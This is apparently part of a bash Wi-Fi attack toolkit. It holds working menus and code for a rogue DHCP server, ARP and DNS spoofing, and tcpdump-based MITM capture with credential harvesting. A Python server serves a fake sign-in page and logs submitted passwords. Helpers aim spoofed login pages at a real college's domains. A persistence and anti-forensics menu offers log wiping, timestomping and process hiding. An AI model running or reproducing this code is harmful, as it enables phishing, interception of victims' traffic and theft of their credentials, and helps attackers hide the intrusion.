# LOCAL NETWORK MENU — MITM proxy added
# ===============================================================
menu_lan() {
    trap on_interrupt INT
    if ! lan_pick_iface; then return; fi
    while true; do
        print_banner
        menu_header "L O C A L   N E T W O R K"
        phb_row "  iface: $LAN_IFACE" "${DIM}${GREY}"
        if [ -n "$SESSION_NAME" ]; then
            phb_row "  session: $SESSION_NAME" "${DIM}${GREEN}"
        fi
        phb_div
        phb_row "  -- SCAN --" "${BOLD}${LIME}"
        phb_row "  [1]  What's on my Wi-Fi"   "${BOLD}${LIME}"
        phb_row "  [2]  Deep scan one device" "${BOLD}${LIME}"
        phb_row "  -- ATTACK --" "${BOLD}${RED}"
        phb_row "  [3]  Attack a device"      "${BOLD}${RED}"
        phb_row "  [M]  Full MITM proxy (capture traffic)" "${BOLD}${RED}"
        phb_row "  -- INFO --" "${BOLD}${CYAN}"
        phb_row "  [4]  My network details"   "${BOLD}${CYAN}"
        phb_row "  [5]  Devices seen before"  "${BOLD}${CYAN}"
        phb_row "  [6]  Look for cameras"     "${BOLD}${CYAN}"
        phb_row "  [7]  Redirect websites"    "${BOLD}${CYAN}"
        phb_row "  [8]  Find hidden networks" "${BOLD}${CYAN}"
        phb_row "  [9]  Change interface"     "${BOLD}${CYAN}"
        phb_row "  -- TOPOLOGY / TRACK --" "${BOLD}${MAGENTA}"
        phb_row "  [T]  Network topology map"   "${BOLD}${MAGENTA}"
        phb_row "  [C]  Wi-Fi client tracker"   "${BOLD}${MAGENTA}"
        phb_row "  [V]  Cred vault"             "${BOLD}${MAGENTA}"
        phb_row "  [S]  Sessions"               "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                 "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" LC
        case "$LC" in
            1) lan_scan_hosts ;;
            2) lan_scan_host_ports ;;
            3) _auto_attack_device ;;
            m|M) _mitm_menu ;;
            4) lan_show_net_info ;;
            5) lan_show_history; addon_wait ;;
            6) lan_find_cameras ;;
            7) menu_standalone_dns ;;
            8) lan_find_hidden ;;
            9) lan_pick_iface ;;
            t|T) _topo_build "$LAN_IFACE"; addon_wait ;;
            c|C) _wifi_track_show ;;
            v|V) _vault_menu ;;
            s|S) _sess_list ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# addon_wait — bulletproof: drain stdin, then read one line
# ===============================================================
# ===============================================================
# _rdhcp_start — clean phb_row output, detached dnsmasq
# ===============================================================
_rdhcp_start() {
    local iface="${1:-$INTERFACE}"
    [ -z "$iface" ] && { echo -e "${RED}[!] no interface${NC}"; return 1; }

    _rdhcp_info "$iface"
    if [ -z "$RDHCP_MYIP" ]; then
        echo -e "${RED}[!] no IP on $iface${NC}"
        return 1
    fi

    # stop any previous instance
    _rdhcp_stop >/dev/null 2>&1
    sleep 1

    # write config
    cat > "$ROGUE_DHCP_CONF" <<EOF
interface=$RDHCP_IFACE
bind-interfaces
listen-address=$RDHCP_MYIP
dhcp-authoritative
dhcp-range=$RDHCP_RANGE_START,$RDHCP_RANGE_END,$RDHCP_NETMASK,5m
dhcp-option=3,$RDHCP_GW
dhcp-option=6,$RDHCP_GW
log-dhcp
port=0
EOF

    # stop systemd-resolved if it grabs port 53 (safe no-op)
    _rdhcp_silent sudo systemctl stop dnsmasq

    # launch FULLY DETACHED — stdout/stderr/stdin all to /dev/null
    # so nothing can leak into the terminal and interfere with the read prompt
    sudo dnsmasq -C "$ROGUE_DHCP_CONF" --log-facility="$ROGUE_DHCP_LOG" \
        </dev/null >/dev/null 2>&1 &
    ROGUE_DHCP_PID=$!
    disown 2>/dev/null
    sleep 2

    if ! pgrep -f "dnsmasq.*$ROGUE_DHCP_CONF" >/dev/null; then
        print_banner
        menu_header "R O G U E   D H C P"
        phb_row "  dnsmasq failed to start." "${BOLD}${RED}"
        phb_row "  last log:" "${DIM}${GREY}"
        [ -f "$ROGUE_DHCP_LOG" ] && tail -5 "$ROGUE_DHCP_LOG" | sed 's/^/    /'
        menu_footer
        return 1
    fi

    # enable forwarding so victim traffic still reaches the internet
    _rdhcp_silent sudo sysctl -w net.ipv4.ip_forward=1
    local wan; wan=$(ip route show default 2>/dev/null | awk '/^default/ {print $5; exit}')
    [ -z "$wan" ] && wan="$iface"
    _rdhcp_silent sudo iptables -t nat -C POSTROUTING -o "$wan" -j MASQUERADE 2>/dev/null || \
        _rdhcp_silent sudo iptables -t nat -A POSTROUTING -o "$wan" -j MASQUERADE
    _rdhcp_silent sudo iptables -C FORWARD -i "$RDHCP_IFACE" -o "$wan" -j ACCEPT 2>/dev/null || \
        _rdhcp_silent sudo iptables -A FORWARD -i "$RDHCP_IFACE" -o "$wan" -j ACCEPT
    _rdhcp_silent sudo iptables -C FORWARD -i "$wan" -o "$RDHCP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
        _rdhcp_silent sudo iptables -A FORWARD -i "$wan" -o "$RDHCP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

    # ---- print clean, inside the box ----
    print_banner
    menu_header "R O G U E   D H C P   R U N N I N G"
    phb_row "  Interface:  $RDHCP_IFACE" "${BOLD}${CYAN}"
    phb_row "  My IP:      $RDHCP_MYIP" "${BOLD}${CYAN}"
    phb_row "  Lease range: $RDHCP_RANGE_START - $RDHCP_RANGE_END" "${BOLD}${CYAN}"
    phb_row "  Gateway:    $RDHCP_GW  (you)" "${BOLD}${GREEN}"
    phb_row "  NAT out:    $wan" "${BOLD}${GREEN}"
    phb_row "  Log:        $ROGUE_DHCP_LOG" "${DIM}${GREY}"
    phb_div
    phb_row "  Victims will route through you after they renew DHCP." "${DIM}${GREY}"
    phb_row "  Their real internet still works (NAT via $wan)." "${DIM}${GREY}"
    phb_div
    phb_row "  Back in the Rogue DHCP menu, use [4] to watch leases." "${BOLD}${YELLOW}"
    menu_footer
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# addon_wait — hard wait that can't be skipped
# ===============================================================
addon_wait() {
    echo ""
    # drain any buffered stdin so a stray newline can't skip
    local _junk
    while IFS= read -r -t 0.05 -n 1 _junk; do :; done 2>/dev/null
    printf "  ${DIM}Press ENTER to return...${NC}"
    # force a fresh read from the terminal
    local _x
    IFS= read -r _x </dev/tty 2>/dev/null
}

# ===============================================================
# MITM — capture start/stop/live with detached tcpdump
# ===============================================================

# start capture — fully detached so it can't touch the terminal
_mitm_start() {
    _mitm_ensure
    local iface="${1:-$INTERFACE}"
    [ -z "$iface" ] && iface="$INTERFACE"

    if [ -f /tmp/phobia_mitm.pid ] && kill -0 "$(cat /tmp/phobia_mitm.pid)" 2>/dev/null; then
        echo -e "${YELLOW}[!] already running (pid $(cat /tmp/phobia_mitm.pid))${NC}"
        return
    fi

    local pcap="$MITM_CAPDIR/capture_$(date +%s).pcap"
    echo "$pcap" > /tmp/phobia_mitm_pcap

    # FULLY detached: stdin / stdout / stderr all to /dev/null, nohup + disown
    sudo nohup tcpdump -i "$iface" -n \
        'tcp port 80 or tcp port 443 or tcp port 21 or tcp port 23 or tcp port 110 or udp port 53' \
        -w "$pcap" </dev/null >/dev/null 2>&1 &
    echo $! > /tmp/phobia_mitm.pid
    disown 2>/dev/null
    sleep 2

    if kill -0 "$(cat /tmp/phobia_mitm.pid)" 2>/dev/null; then
        print_banner
        menu_header "M I T M   C A P T U R E   A C T I V E"
        phb_row "  Interface:  $iface" "${BOLD}${CYAN}"
        phb_row "  PID:        $(cat /tmp/phobia_mitm.pid)" "${BOLD}${CYAN}"
        phb_row "  Pcap file:  $(basename "$pcap")" "${BOLD}${CYAN}"
        phb_row "  Dir:        $MITM_CAPDIR" "${DIM}${GREY}"
        phb_div
        phb_row "  Live view:  [L] opens in a new xterm window" "${BOLD}${GREEN}"
        phb_row "  Analyze:    [5] parses the pcap for creds + URLs" "${BOLD}${GREEN}"
        menu_footer
    else
        echo -e "${RED}[!] tcpdump failed to start${NC}"
        rm -f /tmp/phobia_mitm.pid
    fi
}

_mitm_stop() {
    if [ -f /tmp/phobia_mitm.pid ]; then
        local pid; pid=$(cat /tmp/phobia_mitm.pid)
        _mitm_silent sudo kill "$pid"
        sleep 1
        _mitm_silent sudo kill -9 "$pid"
        rm -f /tmp/phobia_mitm.pid
    fi
    _mitm_silent sudo pkill -f "tcpdump.*$MITM_CAPDIR"
    echo -e "${GREEN}[+] stopped${NC}"
}

# open live view in a separate terminal
# fallback: live view in the current terminal (blocks until Ctrl+C)
# ===============================================================
# MITM menu — with [L] live xterm
# ===============================================================
_mitm_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "F U L L   M I T M   P R O X Y"
        local status="stopped"
        [ -f /tmp/phobia_mitm.pid ] && kill -0 "$(cat /tmp/phobia_mitm.pid 2>/dev/null)" 2>/dev/null && status="running (pid $(cat /tmp/phobia_mitm.pid))"

        phb_row "  Status:   $status" "$([ "$status" != "stopped" ] && echo "${BOLD}${GREEN}" || echo "${BOLD}${RED}")"
        [ -f /tmp/phobia_mitm_pcap ] && phb_row "  Last pcap: $(basename "$(cat /tmp/phobia_mitm_pcap)")" "${DIM}${GREY}"
        phb_row "  Capture dir: $MITM_CAPDIR" "${DIM}${GREY}"
        phb_row "  Creds file:  $MITM_CREDS" "${DIM}${GREY}"
        phb_div
        phb_row "  [1]  Start capture on $INTERFACE" "${BOLD}${GREEN}"
        phb_row "  [2]  Start on custom interface"     "${BOLD}${GREEN}"
        phb_row "  [3]  Stop capture"                   "${BOLD}${RED}"
        phb_row "  -- WATCH LIVE --" "${BOLD}${CYAN}"
        phb_row "  [L]  Live HTTP view (opens new xterm window)" "${BOLD}${CYAN}"
        phb_row "  [l]  Live HTTP view (current terminal)"        "${BOLD}${CYAN}"
        phb_row "  -- ANALYZE --" "${BOLD}${YELLOW}"
        phb_row "  [5]  Analyze latest pcap (URLs, creds, cookies)" "${BOLD}${YELLOW}"
        phb_row "  [6]  Show all harvested creds"                  "${BOLD}${YELLOW}"
        phb_row "  [7]  List saved pcaps"                          "${DIM}${GREY}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " MC
        case "$MC" in
            0) return ;;
            1) _mitm_start "$INTERFACE"; addon_wait ;;
            2) read -p "Interface: " IF; [ -n "$IF" ] && _mitm_start "$IF"; addon_wait ;;
            3) _mitm_stop; addon_wait ;;
            L) _mitm_live_xterm "$INTERFACE" ;;
            l) _mitm_live_inplace "$INTERFACE" ;;
            5) _mitm_analyze; addon_wait ;;
            6) if [ -f "$MITM_CREDS" ]; then cat "$MITM_CREDS"; else echo -e "${DIM}  nothing yet${NC}"; fi; addon_wait ;;
            7) ls -la "$MITM_CAPDIR" 2>/dev/null; addon_wait ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# DNS SPOOF — HTTP page server (so victims actually SEE a page)
# ===============================================================

# write a default fake-login page if $PAGES_DIR is empty
_dnsm_ensure_pages() {
    mkdir -p "$PAGES_DIR" 2>/dev/null
    local have=0
    local f
    for f in "$PAGES_DIR"/*.html; do
        [ -f "$f" ] && have=1 && break
    done
    if [ $have -eq 0 ]; then
        cat > "$PAGES_DIR/fake-login.html" << 'HTMLEOF'
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign in</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
     background:#fff;color:#202124;display:flex;align-items:center;justify-content:center;
     min-height:100vh;padding:24px}
.card{width:100%;max-width:420px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124}
p{text-align:center;font-size:16px;color:#5f6368;margin-bottom:32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;
      font-size:16px;margin-bottom:20px;outline:none}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.1)}
.btn{width:100%;padding:12px;background:#1a73e8;border:0;border-radius:4px;color:#fff;
     font-size:14px;font-weight:500;cursor:pointer}
.btn:active{background:#1557b0}
</style></head>
<body>
<div class="card">
<h1>Sign in</h1>
<p>to continue to your account</p>
<form method="POST" action="/">
<input name="email" type="email" placeholder="Email or phone" required autofocus>
<input name="password" type="password" placeholder="Enter your password" required>
<button class="btn" type="submit">Next</button>
</form>
</div>
</body></html>
HTMLEOF
        echo -e "${GREEN}[+] created default page: $PAGES_DIR/fake-login.html${NC}"
    fi
}

# pick which page to serve (list $PAGES_DIR + [0] default)
# serve the page on :80 — auto-selected per spoofed host
_dnsm_serve_page() {
    local page="$1"
    _dnsm_ensure_pages
    [ -z "$page" ] && page="$PAGES_DIR/fake-login.html"
    [ ! -f "$page" ] && page="$PAGES_DIR/fake-login.html"

    # kill any old instance of ours on :80
    exec 9>&2 2>/dev/null
    sudo pkill -9 -f "phobia_dnspage.py" >/dev/null 2>&1
    exec 2>&9 9>&-

    # tiny python server — serves the page for / and matches
    # the incoming host header to pick a page if a matching one exists
    cat > /tmp/phobia_dnspage.py <<PYEOF
import http.server, socketserver, os, sys

ROOT = "${PAGES_DIR}"
DEFAULT = "${page}"

def pick_page(host_header):
    # if a file like google-login.html exists and host contains 'google'
    # prefer it, otherwise use default
    if host_header:
        first = host_header.split('.')[0].lower()
        for f in os.listdir(ROOT):
            if f.lower().startswith(first) and f.endswith('.html'):
                return os.path.join(ROOT, f)
    return DEFAULT

class H(http.server.BaseHTTPRequestHandler):
    def _serve(self, data, status=200):
        if isinstance(data, str):
            data = data.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        host = (self.headers.get("Host") or "").split(":")[0]
        path = self.path.split("?")[0]

        # explicit routes so Google button works from DNS spoof too
        if path in ("/google-2step.html", "/google-2step", "/google"):
            try:
                self._serve(open(os.path.join(ROOT, "google-2step.html"), "rb").read())
            except Exception:
                self._serve(b"<html><body>google page missing</body></html>")
            return
        if path in ("/verified.html", "/verified"):
            try:
                self._serve(open(os.path.join(ROOT, "verified.html"), "rb").read())
            except Exception:
                self._serve(b"<html><body>verified</body></html>")
            return

        # captive-portal probes → redirect to /
        for probe in ("generate_204","hotspot-detect","connecttest",
                      "ncsi","canonical","success.txt","library/test/success"):
            if probe in self.path:
                self.send_response(302)
                self.send_header("Location", "http://" + (host or "localhost") + "/")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                return
        try:
            page = pick_page(host)
            data = open(page, "rb").read()
        except Exception:
            data = b"<html><body>Sign in</body></html>"
        self._serve(data)

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode("utf-8", "ignore")
        try:
            with open(os.path.join(ROOT, "dns_creds.txt"), "a") as f:
                f.write("FROM %s HOST %s %s\n" % (
                    self.client_address[0],
                    self.headers.get("Host", ""),
                    raw))
        except Exception:
            pass
        print("[+] creds:", self.client_address[0], raw, flush=True)
        # send a small HTML page that redirects to /?verified=1
        # so the bits-login page shows its notification banner
        host = (self.headers.get("Host") or "").split(":")[0]
        html = ('<!DOCTYPE html><html><head><meta charset="utf-8">'
                '<meta http-equiv="refresh" content="0;url=http://%s/?verified=1">'
                '<script>location.href="http://%s/?verified=1";</script>'
                '</head><body></body></html>' % (host, host))
        data = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a): pass

socketserver.TCPServer.allow_reuse_address = True
try:
    srv = socketserver.TCPServer(("0.0.0.0", 80), H)
except OSError as e:
    print("[!] cannot bind :80:", e, file=sys.stderr)
    sys.exit(1)
srv.serve_forever()
PYEOF

    sudo nohup python3 /tmp/phobia_dnspage.py \
        </dev/null >/tmp/phobia_dnspage.log 2>&1 &
    disown 2>/dev/null
    sleep 1

    if pgrep -f "phobia_dnspage.py" >/dev/null; then
        echo -e "${GREEN}[+] HTTP server on :80 serving $(basename "$page")${NC}"
        echo -e "${DIM}    victims hitting any spoofed host see this page${NC}"
    else
        echo -e "${RED}[!] HTTP server failed — port 80 in use?${NC}"
        cat /tmp/phobia_dnspage.log 2>/dev/null | tail -3 | sed 's/^/    /'
    fi
}

# ===============================================================
# dnsm_start — always start the page server
# ===============================================================
dnsm_start() {
    dnsm_ensure_tools
    dnsm_ask || { addon_wait; return; }
    DNSM_IFACE=$(echo "$DNSM_IFACE" | sed 's/[^a-zA-Z0-9]//g')

    exec 9>&2 2>/dev/null
    sudo pkill -9 -f "dnsmasq.*dnsm" >/dev/null 2>&1
    sudo pkill -9 -f arpspoof >/dev/null 2>&1
    exec 2>&9 9>&-

    sleep 1
    rm -f /tmp/dnsm.log
    touch /tmp/dnsm.log

    local conf="/tmp/dnsmasq_dnsm.conf"
    {
        echo "interface=$DNSM_IFACE"
        echo "bind-interfaces"
        echo "listen-address=$DNSM_MYIP"
        echo "port=53"
        echo "server=1.1.1.1"
        echo "server=8.8.8.8"
        echo "no-hosts"
        echo "cache-size=150"
        for h in ${DNSM_SPOOF//,/ }; do
            h=$(echo "$h" | tr -d ' ')
            [ -z "$h" ] && continue
            echo "address=/$h/$DNSM_REDIR"
            echo "address=/www.$h/$DNSM_REDIR"
        done
    } > "$conf"

    if sudo lsof -i :53 2>/dev/null | grep -q systemd-resolve; then
        exec 9>&2 2>/dev/null
        sudo systemctl stop systemd-resolved >/dev/null 2>&1
        exec 2>&9 9>&-
        sleep 1
    fi

    exec 9>&2 2>/dev/null
    sudo dnsmasq -C "$conf" --log-queries --log-facility=/tmp/dnsm.log >/dev/null 2>&1
    exec 2>&9 9>&-
    sleep 1

    if ! sudo pgrep -f "dnsmasq.*$conf" >/dev/null; then
        echo -e "${RED}[!] dnsmasq failed to start.${NC}"
        addon_wait
        return
    fi

    exec 9>&2 2>/dev/null
    sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
    sudo iptables -t nat -D PREROUTING -i "$DNSM_IFACE" -p udp --dport 53 -j REDIRECT --to-port 53 >/dev/null 2>&1
    sudo iptables -t nat -D PREROUTING -i "$DNSM_IFACE" -p tcp --dport 53 -j REDIRECT --to-port 53 >/dev/null 2>&1
    sudo iptables -t nat -A PREROUTING -i "$DNSM_IFACE" -p udp --dport 53 -j REDIRECT --to-port 53 >/dev/null 2>&1
    sudo iptables -t nat -A PREROUTING -i "$DNSM_IFACE" -p tcp --dport 53 -j REDIRECT --to-port 53 >/dev/null 2>&1
    exec 2>&9 9>&-

    if [ -n "$DNSM_GW" ]; then
        if [[ "$DNSM_TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            sudo arpspoof -i "$DNSM_IFACE" -t "$DNSM_TARGET" "$DNSM_GW" </dev/null >/dev/null 2>&1 &
            sudo arpspoof -i "$DNSM_IFACE" -t "$DNSM_GW" "$DNSM_TARGET" </dev/null >/dev/null 2>&1 &
        else
            sudo arpspoof -i "$DNSM_IFACE" "$DNSM_GW" </dev/null >/dev/null 2>&1 &
        fi
        disown 2>/dev/null
        sleep 1
    fi

    # ALWAYS serve a page — this is the fix
    _dnsm_ensure_pages
    if [ -z "$DNSM_SERVE_PAGE" ]; then
        DNSM_SERVE_PAGE="$PAGES_DIR/fake-login.html"
    fi
    _dnsm_serve_page "$DNSM_SERVE_PAGE"

    print_banner
    menu_header "D N S   S P O O F   A C T I V E"
    phb_row "  Interface:  $DNSM_IFACE" "${BOLD}${CYAN}"
    phb_row "  Gateway:    ${DNSM_GW:-none}" "${BOLD}${CYAN}"
    phb_row "  Victim:     $DNSM_TARGET" "${BOLD}${CYAN}"
    phb_row "  Redirect:   $DNSM_REDIR" "${BOLD}${CYAN}"
    phb_row "  Spoofing:   $DNSM_SPOOF" "${BOLD}${CYAN}"
    phb_row "  Page:       $(basename "$DNSM_SERVE_PAGE")" "${BOLD}${GREEN}"
    phb_row "  Creds file: $PAGES_DIR/dns_creds.txt" "${BOLD}${GREEN}"
    phb_row "  DNS log:    /tmp/dnsm.log" "${DIM}${GREY}"
    phb_div
    phb_row "  Victim types spoofed domain → sees your page" "${BOLD}${YELLOW}"
    phb_row "  Ctrl+C to stop" "${BOLD}${RED}"
    menu_footer
    echo ""

    trap 'dnsm_stop; return 0' INT
    while true; do
        sleep 3
        if [ -f /tmp/dnsm.log ]; then
            local n; n=$(wc -l < /tmp/dnsm.log 2>/dev/null)
            printf "\r${DIM}running... victim queries: $n${NC}   "
        fi
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# MITM LIVE — catches all HTTP methods, shows heartbeat
# ===============================================================

# live view in xterm — new window
_mitm_live_xterm() {
    local iface="${1:-$INTERFACE}"
    _mitm_ensure

    if ! command -v xterm >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] xterm not installed — falling back to in-place${NC}"
        _mitm_live_inplace "$iface"
        return
    fi

    # write the live viewer script to a file so xterm can source it
    cat > /tmp/phobia_mitm_live.sh << 'LIVESH'
#!/bin/bash
IFACE="$1"
echo ""
echo "  ╔════════════════════════════════════════════════╗"
echo "  ║           MITM LIVE HTTP STREAM                ║"
echo "  ╚════════════════════════════════════════════════╝"
echo ""
echo "  iface: $IFACE"
echo "  watching all HTTP methods, Host headers, and URLs"
echo "  Ctrl+C to stop"
echo ""
# filter: any HTTP request line (GET/POST/HEAD/PUT/etc) + Host headers
sudo stdbuf -oL tcpdump -i "$IFACE" -l -A -s0 \
    'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48454144)' \
    2>/dev/null \
    | grep --line-buffered -E "^(GET|POST|HEAD|PUT|DELETE|OPTIONS) |^Host: |^Referer: |^User-Agent: " \
    | while IFS= read -r line; do
        case "$line" in
            Host:*|Referer:*|User-Agent:*)
                echo -e "\033[2m    $line\033[0m"
                ;;
            *)
                echo -e "\033[1;32m  ▸ $line\033[0m"
                ;;
        esac
      done
LIVESH
    chmod +x /tmp/phobia_mitm_live.sh

    launch_xterm -bg black -fg '#00ff88' -title "MITM LIVE HTTP" -geometry 130x40 \
        -e bash -c "/tmp/phobia_mitm_live.sh $iface; echo; echo '>>> ended — press ENTER'; read"

    echo -e "${GREEN}[+] live HTTP window opened${NC}"
    echo -e "${DIM}    if you don't see traffic, no HTTP is happening on $iface${NC}"
    echo -e "${DIM}    try opening a non-https site on a victim device${NC}"
    addon_wait
}

# live view in current terminal (with heartbeat so you know it's running)
_mitm_live_inplace() {
    local iface="${1:-$INTERFACE}"
    _mitm_ensure
    echo -e "${CYAN}[*] Live HTTP on $iface (Ctrl+C to stop)${NC}"
    echo -e "${DIM}    showing GET/POST/HEAD + Host/Referer/UA${NC}"
    echo ""

    # background heartbeat so user knows it's alive
    (
        local spin='|/-\'
        local i=0
        while true; do
            printf "\r${DIM}[%s] listening... %s${NC}   " "$(date +%H:%M:%S)" "${spin:$((i%4)):1}"
            i=$((i+1))
            sleep 1
        done
    ) &
    local hb=$!

    trap "kill $hb 2>/dev/null; echo ''; return" INT
    sudo stdbuf -oL tcpdump -i "$iface" -l -A -s0 \
        'tcp port 80' 2>/dev/null \
        | grep --line-buffered -E "^(GET|POST|HEAD|PUT|DELETE|OPTIONS) |^Host: |^Referer: |^User-Agent: " \
        | while IFS= read -r line; do
            printf "\r\033[K"
            case "$line" in
                Host:*|Referer:*|User-Agent:*)
                    echo -e "\033[2m    $line\033[0m"
                    ;;
                *)
                    echo -e "\033[1;32m  ▸ $line\033[0m"
                    ;;
            esac
        done
    kill $hb 2>/dev/null
    trap on_interrupt INT
}

# ===============================================================
# STEALTH MENU — redefined so [s] works from WiFi main
# ===============================================================
addon_stealth_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "P E R S I S T E N C E   &   S T E A L T H"
        phb_row "  -- PERSIST --" "${BOLD}${ORANGE}"
        phb_row "  [1]  Install persistence (cron + systemd)" "${BOLD}${ORANGE}"
        phb_row "  -- HIDE --" "${BOLD}${CYAN}"
        phb_row "  [2]  Hide current process" "${BOLD}${CYAN}"
        phb_row "  [5]  Rename process"       "${BOLD}${CYAN}"
        phb_row "  -- ANTI-FORENSICS --" "${BOLD}${YELLOW}"
        phb_row "  [3]  Wipe logs"            "${BOLD}${YELLOW}"
        phb_row "  [4]  Timestomp files"      "${BOLD}${YELLOW}"
        phb_row "  [6]  Counter-forensics"    "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                 "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) command -v addon_persist_install >/dev/null 2>&1 && addon_persist_install || echo -e "${YELLOW}[!] function not available${NC}"; addon_wait ;;
            2) command -v addon_hide_process >/dev/null 2>&1 && addon_hide_process || echo -e "${YELLOW}[!] function not available${NC}"; addon_wait ;;
            3) command -v addon_wipe_logs >/dev/null 2>&1 && addon_wipe_logs || echo -e "${YELLOW}[!] function not available${NC}"; addon_wait ;;
            4) command -v addon_timestomp >/dev/null 2>&1 && addon_timestomp || echo -e "${YELLOW}[!] function not available${NC}"; addon_wait ;;
            5) command -v addon_rename_process >/dev/null 2>&1 && addon_rename_process || echo -e "${YELLOW}[!] function not available${NC}"; addon_wait ;;
            6) command -v addon_counter_forensics >/dev/null 2>&1 && addon_counter_forensics || echo -e "${YELLOW}[!] function not available${NC}"; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# MAIN MENU — [s] opens stealth, [7] opens DNS spoof
# ===============================================================
main_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "M A I N   M E N U"
        phb_row "  iface: $INTERFACE   monitor: ${MONITOR_ACTUAL:-$MONITOR}" "${DIM}${GREY}"
        phb_div
        phb_row "  -- INTERFACE --" "${BOLD}${LIME}"
        phb_row "  [m]  Monitor mode"          "${BOLD}${LIME}"
        phb_row "  [n]  Managed mode"          "${BOLD}${LIME}"
        phb_row "  [k]  Kill stuck tasks"      "${BOLD}${LIME}"
        phb_row "  -- ATTACKS --" "${BOLD}${ORANGE}"
        phb_row "  [1]  DoS attacks"           "${BOLD}${ORANGE}"
        phb_row "  [2]  Handshake / PMKID"     "${BOLD}${SKY}"
        phb_row "  [3]  Offline / WEP / WPS"   "${BOLD}${VIOLET}"
        phb_row "  [4]  Evil Twin attacks"     "${BOLD}${CYAN}"
        phb_row "  [5]  Enterprise"            "${BOLD}${YELLOW}"
        phb_row "  [6]  WPA3"                  "${BOLD}${PINK}"
        phb_row "  [7]  DNS spoof (standalone)" "${BOLD}${MAGENTA}"
        phb_row "  -- OPSEC --" "${BOLD}${RED}"
        phb_row "  [s]  Persistence & stealth" "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Select: '${NC})" CH
        loading_bar "Loading"
        case "$CH" in
            0) return ;;
            m|M) put_in_monitor_mode ;;
            n|N) put_in_managed_mode ;;
            k|K) kill_stuck ;;
            s|S) addon_stealth_menu ;;
            1) menu_dos ;;
            2) menu_handshake ;;
            3) menu_offline_wep_wps ;;
            4) menu_evil_twin ;;
            5) menu_enterprise ;;
            6) menu_wpa3 ;;
            7) menu_standalone_dns ;;
            *) echo "invalid"; sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# BITS login page — spoof support
# ===============================================================
# The pick-page menus will find bits-login.html automatically from
# $PAGES_DIR. This block just reminds the spoof config where to route
# BITS-related hostnames.

_bits_domains() {
    echo "bitscollege.edu.et,www.bitscollege.edu.et,bits.edu.et,www.bits.edu.et"
}

# convenience — set bits-login.html as the current captive page
_bits_set_default_page() {
    [ -f "$PAGES_DIR/bits-login.html" ] || {
        echo -e "${RED}[!] bits-login.html not found${NC}"
        return 1
    }
    echo "bits-login.html" > "$PAGES_DIR/.current"
    echo -e "${GREEN}[+] current page = bits-login.html${NC}"
    echo -e "${DIM}    DNS spoof and evil twin will serve this for victims${NC}"
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# PAGE PICKER — shows bits-login as a highlighted option
# ===============================================================
_dnsm_pick_page() {
    _dnsm_ensure_pages
    local pages=()
    local f
    while read -r f; do
        [ -n "$f" ] && pages+=("$f")
    done < <(find "$PAGES_DIR" -maxdepth 1 -name "*.html" 2>/dev/null | sort)

    print_banner
    menu_header "P I C K   P A G E"
    phb_row "  Page served to victims on :80" "${DIM}${GREY}"
    phb_div
    local i=1
    local current=""
    [ -f "$PAGES_DIR/.current" ] && current=$(cat "$PAGES_DIR/.current")
    for f in "${pages[@]}"; do
        local base; base=$(basename "$f")
        local mark=""
        [ "$base" = "$current" ] && mark=" ${GREEN}[current]${NC}"
        # highlight the recommended page
        local prefix=""
        if [ "$base" = "bits-login.html" ]; then
            prefix="${BOLD}${LIME}★${NC} "
        elif [ "$base" = "google-2step.html" ]; then
            prefix="${BOLD}${SKY}★${NC} "
        fi
        phb_row "  [$i]  ${prefix}${base}${mark}" "${BOLD}${GREEN}"
        eval "DNSM_PAGE_$i=\"$f\""
        i=$((i+1))
    done
    phb_div
    phb_row "  [c]  Cancel" "${RED}"
    menu_footer
